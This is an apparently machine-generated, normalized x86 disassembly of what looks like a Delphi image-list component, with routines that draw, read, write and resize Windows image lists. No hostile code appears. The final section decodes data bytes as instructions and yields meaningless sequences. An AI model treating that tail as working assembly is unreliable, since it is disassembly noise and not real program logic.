mov dl 0x1
mov eax esi
call sub_42150c
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_440f50
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_440f74
pop ebx
pop ebp
retn 0xc
sub_440f74
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44091c
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_440fc0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_41242c
mov eax [ ebp - 0x4 ]
call sub_441c54
xor eax eax
push ebp
push sub_441159
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4201d4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44113c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4201d4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44111f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_42150c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441126
mov eax [ ebp - 0x10 ]
call sub_4030f0
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_42079c
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_41d6c8
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_41dadc
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_42079c
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_41d6c8
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_41dadc
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_440b94
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_441168
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_440a58
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_440fc0
sub_441188
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov eax ebx
call sub_440abc
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_413e5c
mov eax ebx
call sub_440d10
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_441370
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_440a58
mov edx eax
mov eax ebx
call sub_4409f4
mov eax ebx
call sub_44091c
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_440a58
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_440924
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_440a58
push eax
call ImageList_GetBkColor
call sub_44078c
mov edx eax
mov eax ebx
call sub_440d1c
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_441168
jmp r-xdata
sub_441248
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_413f40
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_441370
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_440d10
mov eax esi
call sub_440a58
mov edx eax
mov eax ebx
call sub_4409f4
mov eax ebx
call sub_44091c
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_440a58
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_440924
jmp r-xdata
mov eax esi
call sub_440a58
push eax
call ImageList_GetBkColor
call sub_44078c
mov edx eax
mov eax ebx
call sub_440d1c
mov edx esi
mov eax ebx
call sub_441168
pop esi
pop ebx
retn
sub_4412f8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_441364
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44136b
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_441398
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_413860
mov si 0xffff
call sub_4032ec
inc ebp
dec edi
jne r-xdata
sub_4413e8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413750
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413860
cmp ebp eax
jne r-xdata
sub_441440
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_407a3c
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_441484
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_440c60
mov ebx eax
mov eax edi
call sub_440c60
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_440c60
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_441560
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_441543
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_441440
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44154a
mov eax [ ebp - 0xc ]
call sub_4030f0
retn
mov eax edi
call sub_440c60
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_441574
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_440c60
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_441484
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_4415d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_419e84
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_441574
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_441628
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_415ad0
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_415ad0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4201d4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4418ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4158a4
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_4158c4
mov dl 0x1
mov eax [ r-xdata ]
call sub_4201d4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44188f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4201d4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4201d4
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_42150c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_41242c
mov eax [ ebp - 0x4 ]
call sub_441c54
xor eax eax
push ebp
push sub_441872
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441879
mov eax [ ebp - 0xc ]
call sub_4030f0
mov eax [ ebp - 0x14 ]
call sub_4030f0
mov eax [ ebp - 0x4 ]
call sub_441c58
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_412454
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_42079c
push eax
mov eax [ ebp - 0xc ]
call sub_42079c
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41d594
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_412454
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_42079c
push eax
mov eax [ ebp - 0x14 ]
call sub_42079c
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41d594
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_440b94
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_4418bc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a604
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44191c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_440a2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441923
mov eax [ ebp - 0xc ]
call sub_4030f0
retn
sub eax 0xffffffec
sub_441923
mov eax [ ebp - 0x4 ]
call sub_44091c
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_441a52
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4158c4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_415fcc
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_4158c4
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4030f0
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_4158c4
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a604
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_441a35
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_4158c4
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_440a2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4030f0
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_4158c4
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_441a84
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_440abc
mov eax edi
call sub_4158a4
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_4158c4
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_441628
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_4418bc
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_441b10
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a604
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_441c0a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40ba10
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_440a58
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_440a58
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441c11
mov eax [ ebp - 0x4 ]
call sub_4030f0
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
call sub_403864
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
call sub_403864
jmp r-xdata
sub_441c78
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e0
test bl bl
jle r-xdata
mov edx esi
call sub_4413e8
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_441cc4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_441ce9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441cf0
retn
sub_441d00
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
sbb eax 0xc0044
add [ eax ] al
xor al 0x6d
inc eax
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ edx ] cl
inc ebp
dec ebp
outsb
jne r-xdata
cwde
sbb eax 0x10080044
push esp
dec ebp
outsb
jne r-xdata
jb r-xdata
add [ ecx + 0x44 ] ch
add [ eax ] al
push 0x65676e61
inc ebp
or [ gs : ebp + ecx * 2 + 0x65 ] edx
outsb
outsd
jb r-xdata
jb r-xdata
outsb
je r-xdata
arpl [ eax + ecx + 0x7 ] si
je r-xdata
pop eax
sbb eax 0xa030044
push esp
dec ebp
outsb
jne r-xdata
inc ecx
inc ebx
popad
outsb
jbe r-xdata
or [ edi ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
jb r-xdata
jae r-xdata
arpl [ eax + eax + 0x8 ] si
adc [ eax ] al
insd
add [ edi ] al
push edx
bound esi [ gs : ebp + 0x69 ]
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
insb
and [ eax + eax ] eax
jbe r-xdata
outsb
inc ebp
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
or [ edi ] al
inc ecx
inc ebx
popad
outsb
jbe r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x7 ] si
adc [ 0x63655241 ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
in al dx
mov eax 0x41
add [ eax ] al
or [ esi + 0x40 ] bl
outsb
arpl [ ebp + 0x64 ] sp
jne r-xdata
outsb
popad
imul eax [ ecx ] 0x0
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebp + ebx + 0x44 ] dl
add [ esi ] al
insd
bound ecx [ esi + 0x6f ]
outsb
pop es
insd
bound eax [ edx + 0x72 ]
popad
imul ecx [ edx ] 0x6d
bound eax [ edx + 0x61 ]
jb r-xdata
push ebx
insb
add [ eax ] cl
arpl [ ebp + 0x9 ] sp
push esp
dec ebp
jb r-xdata
jae r-xdata
push esp
push edx
arpl [ gs : eax + eax + 0x8 ] si
arpl [ gs : eax + ecx + 0x7 ] si
jae r-xdata
jb r-xdata
popad
jae r-xdata
push esp
dec edi
ja r-xdata
jb r-xdata
jb r-xdata
or [ edi ] al
inc ecx
inc ebx
popad
outsb
jbe r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ 0x63655241 ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
arpl [ gs : ebp + 0x64 ] si
pop es
insb
je r-xdata
add eax 0x63655241
hlt
popad
add [ bx + si ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x1f ] al
inc esp
add [ ebx ] cl
insd
jb r-xdata
push 0x6e490774
jb r-xdata
add ah dl
push ds
inc esp
add [ eax ] cl
adc eax 0x6e654d54
ja r-xdata
inc esp
add [ eax ] cl
adc dl [ ebp + ecx * 2 + 0x65 ]
outsb
jne r-xdata
popad
imul eax [ 0x756e654d ] 0x73
lea eax [ eax ]
popad
inc ecx
jne r-xdata
jae r-xdata
add [ 0x74617453 ] al
andps xmm1 [ gs : edi + 0x77 ]
push esp
push edx
arpl [ gs : eax + eax + 0x5 ] si
push ebx
je r-xdata
arpl [ eax + ecx + 0x7 ] si
jae r-xdata
inc eax
add [ ebx + esi ] ch
outsd
insd
popad
je r-xdata
dec ebp
outsb
dec ecx
je r-xdata
dec ebp
outsb
jb r-xdata
jb r-xdata
ja r-xdata
je r-xdata
inc edx
outsd
outsd
insb
popad
pop es
jb r-xdata
add [ 0x74646957 ] eax
push esp
inc ebx
popad
outsb
jbe r-xdata
je r-xdata
popad
je r-xdata
add eax 0x63655241
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x35f80040 ] ah
inc esp
add [ esi + ebx * 2 + 0x3c080044 ] al
inc esp
add [ esi + edi + 0x41 ] bl
add [ eax + 0x3a ] dl
inc esp
add ah bh
pop esi
inc esp
add [ edi + ebx * 4 + 0x41 ] ch
add [ eax + 0x41 ] ah
add [ edx - 0x6083ffbf ] dl
inc ecx
add [ edi + ebx * 4 + 0x41 ] dh
add [ edx + 0x357c0041 ] bl
inc esp
add ah cl
push eax
inc esp
add [ esi + edi + 0x44 ] bl
add [ edx + edx * 2 + 0x44 ] bh
add al ch
pop ecx
inc esp
add [ edi + edx * 2 + 0x58dc0044 ] ah
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
pop eax
add [ eax ] al
add [ edi ] al
add bh ch
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] r-xdata
inc eax
add [ eax ] dh
or bh dh
inc ebx
add [ eax ] ah
xor eax [ eax ]
arpl [ eax ] cx
insd
popad
dec ebp
popad
je r-xdata
je r-xdata
jne r-xdata
insd
inc ebp
jbe r-xdata
sub al 0x33
add [ eax ] al
add [ eax ] cl
jne r-xdata
jb r-xdata
je r-xdata
jne r-xdata
dec ebp
outsb
insd
inc ebp
jbe r-xdata
add [ eax ] cl
sbb dl [ ecx + eax * 2 + 0x64 ]
jbe r-xdata
ja r-xdata
je r-xdata
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push es
outsb
jne r-xdata
imul esp [ ebx + 0x8 ] 0x614d616d
jae r-xdata
push 0x746e4907
outsb
andps xmm1 [ edi + 0x77 ]
test [ ebx ] sub_403320
insb
or [ ebp + 0x61 ] ch
push eax
popad
jb r-xdata
inc esp
add al dl
mov [ 0x35500041 ] eax
inc esi
insb
popad
add [ bx + si ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x1f ] al
inc esp
add [ 0x756e654d ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x20 ] bh
insd
inc ecx
jne r-xdata
outsb
je r-xdata
inc esp
add [ eax ] ah
mov [ 0xffffffffa3b40041 ] eax
inc ecx
add [ eax ] cl
movsb [ edi ] [ esi ]
inc ecx
add [ edx + esi ] dh
inc esp
add [ edx + esi + 0x44 ] ch
add [ edx + esi + 0x33300044 ] bl
inc esp
add ah cl
xor al [ eax + eax + 0x40 ]
inc [ ebx ]
cld
xor al [ eax + eax + 0x6c ]
xor eax [ eax + eax - 0x60 ]
xor eax [ eax + eax - 0x2c ]
xor eax [ eax + eax + 0x30 ]
xor al 0x44
add [ eax + 0x34 ] dl
